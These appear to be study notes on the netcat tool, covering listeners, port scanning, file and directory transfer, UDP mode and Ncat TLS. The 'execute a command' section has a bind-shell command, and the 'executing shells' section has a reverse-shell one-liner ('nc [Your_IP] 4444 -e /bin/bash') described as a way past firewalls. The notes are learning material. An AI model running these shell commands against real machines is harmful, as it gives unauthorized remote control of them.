                        NETCAT(nc)
                    ===============
- Is a versatile networking tool taht can be used for a variety of purposes, including:
    >> port scanning
    >> transferring files
    >> acting as a simple server or client

Flag |   Name      | Usage
-----|-------------|-------------------------------------------------------------------------
-l   |   Listen    |  Used to create a server/listener.
-v   |   Verbose   |  Shows detailed info (highly recommended).
-p   |   Port      |  Specifies the port number.
-u   |   UDP       |  Switches from TCP (default) to UDP mode.
-n   |   Numeric   |  Stops NC from trying to resolve hostnames via DNS (makes it faster).
-w   |   Timeout   |  Stops the connection after X seconds of inactivity.
-k   |   Keep-Open | Keeps the listener alive even after a client disconnects.


                    COMMON USES     
                ==================      
- When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us.
- To do this we need to create a listener to listen for a connection to our machine on a certain port that we are going to specify.
	EG.
		nc -lnvp 87  -->  nc -lnvp <port number>

			-l :- Listen mode for inbound connects.

			-n :- Numeric-only ip addresses, no dns.

			-v :- verbose. will give us all the info. 

			-p :- local port number.


- Listening for incoming connections.
    EG.
        nc -l -p port ----> nc -l -p 1234
            OR 
        nc -l port ----> nc -l 1234
            OR 
        # to accept multiple sequential connections:
        nc -l -k 1234 


- connect to a remote host:
    EG. 
        nc hostname port --> nc example.com 80

            * If you type on one side; it appears on the other.

- Port scanning.
    EG. [[tcp connection]]
        nc -zv hostname start_port-end_port ----> nc -zv example.com 80-100

            -z : tells netcat to report a connection status without sending any actual data.
                 Not a replacement for nmap.
            -v : Verbose shows open/closed messages.

    EG. [[udp connections]]
        nc -zvu hostname start_port-end_port ----> nc -zvu example.com 80-100


- Transferring files between sender and reciever.
    EG. 
        nc -l -p port < sending_file

            EG.<<transferring file.txt on port 12345>>
                nc -l -p 12345 < file.txt

            OR 
        
        nc -lvp port > recieved_file.txt 
            
            EG. << recieving file.txt on port 12345>>
                nc -l -p 12345 > file.txt 


    EG. 
        nc hostname port > recieving_file

            EG.<<receive file.txt from hostname on port 12345>>
                nc localhost 12345 > file1.txt

            OR 

        nc hostname port < sending_file

            EG. << sending file.txt from hostname on port 12345>>
                nc localhost 12345 < file.txt


- Transferring a directory (using tar)
    EG.
        # Receiver side
        nc -l 1234 | tar -xzf - 

        # Sender 
        tar -czf - directory | nc <receiver_ip> 1234


- UDP mode.
    - use -u for UDP.
    - It is connectionless.
    - Ordering and delivery are not guaranteed.
        EG.
            # send a UDP packet.
            echo "hello" | nc -u <host> <port>

            # Listen on UDP.
            nc -u -l 5353 > udp_output.txt 


- connect to a remote server and send data
    EG.
        echo "hello world" | nc example.com 12345


- Set a timeout for a connection.
    EG.
        nc -w 5 example.com 12345

            - waits 5 seconds for a timeout.


- execute a command 
    EG.
        nc -l -p 4440 -e /bin/bash


- Running netcat in the background:
    EG.
        nc -l -p 12345 &


- executing shells.
    - Reverse shell (the target connects to YOU)
        > This is more common because it bypasses most firewalls (which usually block incoming connections but allows outgoing ones).
            EG.
                # Your machine (Listening)
                nc -lvp 4444

                # Target machine (Connecting back to you)
                nc [Your_IP] 4444 -e /bin/bash


- Using Ncat for safer exec and TLS 
    - Ncat adds features like:
        --exec : Runs a program directly (no shell).
        --sh-exec : Runs via a shell.
        --ssl : to encrypt the connection.
            EG.
            # USING --EXEC
                # Print system uptime to whoever connects (lab only)
                ncat -l 4444 --exec "/usr/bin/uptime"

                ncat localhost 4444
                # client sees uptime output then disconnects

        # USING TLS
            # OpenBSD nc has -c and -C TLS options 
            # Listen with TLS (OpenBSD nc)
            nc -l -c -C cert.pem 12345

        # USING --SSL 
            # Ncat server with SSL
            ncat --ssl -l 4433 --exec "/usr/bin/uptime"

            # Client:
            ncat --ssl server.example.com 4433


-  